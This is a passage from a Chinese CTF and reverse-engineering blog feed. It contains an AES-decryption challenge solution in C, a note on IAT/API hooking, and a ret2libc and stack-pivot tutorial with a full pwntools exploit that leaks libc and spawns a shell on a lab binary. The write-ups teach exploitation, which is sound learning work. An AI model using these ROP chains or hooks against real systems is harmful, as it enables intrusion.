class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 = roundkeys++;</span><br><span class="line">c[i] ^= *v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ <span class="built_in">mul2</span>(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ <span class="built_in">mul2</span>(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ <span class="built_in">mul2</span>(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ <span class="built_in">mul2</span>(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* c, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">BYTE* u = <span class="number">0</span>;</span><br><span class="line">roundkeys = &amp;roundkeys[<span class="number">175</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] = *u ^ c[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">9</span>; j &gt;= <span class="number">1</span>; --j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cToTmp</span>(tmp, m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">m[i] = tmp[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">inv_shiftrows</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>; ++i)</span><br><span class="line">m[i] = SBOX[m[i]];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xf</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">u = roundkeys--;</span><br><span class="line">m[i] ^= *u;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">encMain</span><span class="params">(BYTE* roundKey, BYTE* m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//auto part1 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(0, m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">//auto part2 = reinterpret_cast&lt;BYTE*&gt;(const_cast&lt;char*&gt;(m.substr(m.length() / 2).c_str()));</span></span><br><span class="line"><span class="comment">/*BYTE* part1 = const_cast&lt;BYTE*&gt;(m.data());*/</span></span><br><span class="line"></span><br><span class="line">BYTE c[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m, c);</span><br><span class="line"><span class="built_in">aes_encrypt_128</span>(roundKey, m + <span class="number">16</span>, &amp;c[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, c[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decMain</span><span class="params">(BYTE* roundKey, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, c, m);</span><br><span class="line"><span class="built_in">aes_decrypt_128</span>(roundKey, &amp;c[<span class="number">16</span>], m + <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, m[i]);</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE m[] = <span class="string">&quot;11111111111111111111111111111111\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rkey[<span class="number">179</span>] = &#123;</span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x98</span>, <span class="number">0x91</span>, <span class="number">0xF1</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x9A</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0x0A</span>, <span class="number">0xFC</span>, <span class="number">0x8A</span>, <span class="number">0xEC</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x96</span>, <span class="number">0xDD</span>, <span class="number">0x13</span>, <span class="number">0xAB</span>, <span class="number">0x38</span>, <span class="number">0xA3</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x75</span>, <span class="number">0x8A</span>, <span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x4E</span>, <span class="number">0x98</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x93</span>, <span class="number">0x8B</span>, <span class="number">0x20</span>, <span class="number">0x7D</span>, <span class="number">0x30</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0xAA</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB3</span>, <span class="number">0x34</span>, <span class="number">0x0A</span>, <span class="number">0xAB</span>, <span class="number">0x20</span>, <span class="number">0xBF</span>, <span class="number">0x2A</span>, <span class="number">0xD6</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x0A</span>, <span class="number">0x5E</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xA0</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD7</span>, <span class="number">0xD4</span>, <span class="number">0x80</span>, <span class="number">0x0C</span>, <span class="number">0xF7</span>, <span class="number">0x6B</span>, <span class="number">0xAA</span>, <span class="number">0xDA</span>, <span class="number">0xE7</span>, <span class="number">0xD6</span>, <span class="number">0xA0</span>, <span class="number">0x84</span>, <span class="number">0x6E</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x4B</span>,</span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0xB7</span>, <span class="number">0x33</span>, <span class="number">0x93</span>, <span class="number">0x9C</span>, <span class="number">0xDC</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0x7B</span>, <span class="number">0x0A</span>, <span class="number">0x39</span>, <span class="number">0xCD</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x39</span>, <span class="number">0x86</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0xA5</span>, <span class="number">0x77</span>, <span class="number">0xCA</span>, <span class="number">0xF0</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x83</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x4E</span>, <span class="number">0x9E</span>, <span class="number">0x65</span>, <span class="number">0xEE</span>, <span class="number">0xC8</span>,</span><br><span class="line"><span class="number">0xA1</span>, <span class="number">0x8D</span>, <span class="number">0x9F</span>, <span class="number">0xC1</span>, <span class="number">0x51</span>, <span class="number">0xF4</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x87</span>, <span class="number">0xA6</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xE2</span>, <span class="number">0x48</span>, <span class="number">0xC4</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xDF</span>, <span class="number">0x83</span>, <span class="number">0xDA</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0xF2</span>, <span class="number">0x98</span>, <span class="number">0xA9</span>, <span class="number">0xAC</span>, <span class="number">0x54</span>, <span class="number">0x94</span>, <span class="number">0xED</span>, <span class="number">0x4E</span>, <span class="number">0x1C</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8F</span>, <span class="number">0x48</span>, <span class="number">0x68</span>, <span class="number">0x22</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x83</span>, <span class="number">0x0C</span>, <span class="number">0x8A</span>, <span class="number">0x6A</span>, <span class="number">0xD3</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x15</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//encMain(rkey, m);</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> c[<span class="number">8</span>] = &#123;</span><br><span class="line"><span class="number">0x768E076C</span>, <span class="number">0x8A2F31A6</span>, <span class="number">0xE452B98D</span>, <span class="number">0xAA000D64</span>, <span class="number">0x48802D4B</span>, <span class="number">0xEC290C73</span>, <span class="number">0x17F0FFC3</span>, <span class="number">0x2785A657</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decMain</span>(rkey, <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(c));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 爆破 </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》0A-API勾取</title>
      <link href="/posts/6dc52a20.html"/>
      <url>/posts/6dc52a20.html</url>
      
        <content type="html"><![CDATA[<h2 id="API勾取">API勾取</h2><p>实际上就是对程序使用的系统API进行Hook</p><p><img src="https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png" alt="image-20250110233657957"></p><p>可以修改IAT/EAT/代码，对于直接hook代码，和之前的inlineHook一样<br>对于IAT，是程序执行对应API代码时，IAT会存放对应函数偏移，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp cs:offset</span><br><span class="line">......</span><br><span class="line">offset 真实偏移</span><br></pre></td></tr></table></figure><p>可以直接修改这里的真实偏移，然后跳转到自己的代码中，最后跳转到真实偏移地址。</p><p>本质上还是Hook，但是要注意参数的传递，具体可以看之前的调用约定那一篇或者具体调试分析。</p><h2 id="实践">实践</h2><p>详见下面这个项目：</p><p><a href="https://github.com/43287/AntiAntiDebug_plugin_for_IDA8.3">43287/AntiAntiDebug_plugin_for_IDA8.3: 一个只支持x64的IDA反调试插件</a></p><p>其中使用了IAThook和InlineHook</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc与栈迁移</title>
      <link href="/posts/26c65c86.html"/>
      <url>/posts/26c65c86.html</url>
      
        <content type="html"><![CDATA[<h3 id="RET2libc">RET2libc</h3><p>一般情况下，一个程序不会有system(“bin/sh”)这种危险代码让我们直接getshell。</p><p>ret2libc是一种方法，让我们取得外部动态链接库(so)的基地址，并通过基地址加偏移的方式获得目标库函数的地址，从而在程序没有主动调用目标函数时修改ret地址返回到我们想要的库函数地址。</p><p>练习题：</p><p>打开先checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>有部分RELRO和NX保护</p><p>vuln函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了一次输出，一次输入，输入长度为112，很明显可以覆盖地址</p><p>程序没有bin/sh字符串和system地址，所以只能自己泄漏出来</p><p>got表会先按执行顺序生成地址，所以先进入main后一定会先生成__libc_start_main函数。通过这个得到libc基地址然后加对应偏移得到system和bin/sh地址，最后构造rop链去执行函数</p><p>顺序：</p><p>vuln–&gt;puts–&gt;system</p><p>现在还有一个问题，我们控制的地址只是栈，但是puts函数的传参却在寄存器里面，该如何把栈中的值放到寄存器里呢，很明显，pop指令</p><p>可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8     ; __unwind &#123;</span><br><span class="line">.text:00000000004011E8 000                 endbr64</span><br><span class="line">.text:00000000004011EC 000                 push    rbp</span><br><span class="line">.text:00000000004011ED 008                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011F0 008                 sub     rsp, 70h</span><br><span class="line">.text:00000000004011F4 078                 lea     rax, s          ; &quot;RET2LIBC &gt;_&lt;&quot;</span><br><span class="line">.text:00000000004011FB 078                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011FE 078                 call    _puts</span><br><span class="line">.text:0000000000401203 078                 lea     rax, [rbp+var_70]</span><br><span class="line">.text:0000000000401207 078                 mov     rdi, rax</span><br><span class="line">.text:000000000040120A 078                 mov     eax, 0</span><br><span class="line">.text:000000000040120F 078                 call    _gets</span><br><span class="line">.text:0000000000401214 078                 nop</span><br><span class="line">.text:0000000000401215 078                 leave</span><br><span class="line">.text:0000000000401216 000                 retn</span><br><span class="line">.text:0000000000401216     ; &#125; // starts at 4011E8</span><br><span class="line">.text:0000000000401216     vuln            endp</span><br></pre></td></tr></table></figure><p>这里传给puts的值是rdi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>用gadget看看，发现0x00000000004011e3 : pop rdi ; ret<br>如果先返回这个地址，就可以把写入栈的泄露地址给rdi，然后执行后面的操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x00000000004011e3</span>)+p64(libc_start_main_got)+p64(<span class="number">0x401060</span>)+p64(<span class="number">0x401090</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span> +p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x00000000004011e3</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="栈迁移">栈迁移</h3><p>打开task题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know Stack_Pivoting?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401221</span>     main            proc near               ; DATA XREF: _start+<span class="number">18</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401221</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401221</span> <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401225</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401226</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401229</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>E <span class="number">008</span>                 call    init</span><br><span class="line">.text:<span class="number">0000000000401233</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401238</span> <span class="number">008</span>                 call    vuln</span><br><span class="line">.text:<span class="number">000000000040123</span>D <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">008</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401243</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401243</span>     ; &#125; <span class="comment">// starts at 401221</span></span><br><span class="line">.text:<span class="number">0000000000401243</span>     main            endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>DB     ; <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span></span><br><span class="line">.text:00000000004011DB                     public gadget</span><br><span class="line">.text:00000000004011DB     gadget          proc near</span><br><span class="line">.text:00000000004011DB     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004011</span>DB <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000004011</span>DF <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004011E0</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004011E3</span> <span class="number">008</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">00000000004011E4</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004011E4</span>     gadget          endp</span><br><span class="line">.text:<span class="number">00000000004011E4</span></span><br><span class="line">.text:<span class="number">00000000004011E4</span>     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004011E5</span>                     align <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004011E6</span>                     pop     rbp</span><br><span class="line">.text:<span class="number">00000000004011E7</span>                     retn</span><br><span class="line">.text:<span class="number">00000000004011E7</span>     ; &#125; <span class="comment">// starts at 4011DB</span></span><br></pre></td></tr></table></figure><p>依然没有bin/sh和system，所以依然需要ret2libc</p><p>但是观察read函数可以发现，可以写入0x50，数组长度0x40，所以只能写入2个地址去覆盖，这里很明显是不够的，<br>然后看看有没有可能修改0x50这个数，发现没有</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure><p>如果按上一个题(ret2libc)两次分别需要写入：</p><p>pop_rdi+libc地址+puts地址+start地址<br>pop_rdi+bin/sh地址+system地址</p><p>对于16字节，还是不够的，所以不妨换个思路，如果写入的内容区域不能改变，那要是可以改变rsp指针也可以，如果算上所有的空间，有0x50个，这样就够了，只要想办法把rsp放到这个空间开头就好了</p><p>能修改rsp的指令是leave<br>效果是：mov rsp，rbp；pop rbp</p><p>但是这个指令只能使得rsp指向rbp指向的地址，因此，在栈迁移中，rbp就类似一个引子，通过修改rbp的值间接修改rsp的值。每次leave之后，都会pop rbp，一定注意这里pop出的地址就是rsp下次的地址。对于这个题，每次可写的区域是rbp之上的内容(rbp-0x40)和rbp下次的地址和ret地址</p><p><img src="https://s2.loli.net/2025/01/04/TE8YqDnzmgLeG1O.png" alt="image-20250103235741084"></p><p>如果这样写入，会直接跳过rop链(因为read之后直接leave了)然后rsp就到下面了，这样无法实现执行的效果，但是每次read之后必然是ret，所以这时需要一个方法把rsp放到上面去</p><p><img src="https://s2.loli.net/2025/01/04/6lG5YXwLsKqk9RT.png" 